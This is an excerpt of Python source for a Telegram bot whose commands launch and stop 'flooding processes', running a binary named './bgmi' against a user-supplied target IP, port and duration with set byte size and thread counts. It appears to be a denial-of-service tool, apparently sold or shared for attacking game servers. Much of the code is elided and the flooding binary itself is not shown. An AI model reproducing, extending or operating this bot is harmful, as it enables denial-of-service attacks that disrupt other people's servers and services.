...
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    flooding_command = ['./bgmi', target_ip, port, duration, str(BYTE_SIZE), str(DEFAULT_THREADS)]
...
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if user_id not in flooding_processes or flooding_processes[user_id] is None:
        await update.message.reply_text('No flooding process is running for you.')
        return

    flooding_processes[user_id].terminate()
    flooding_processes[user_id] = None
...
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    response = (
        ...
        "/stop - Stop your flooding process.\n"
    )
    await update.message.reply_text(response)
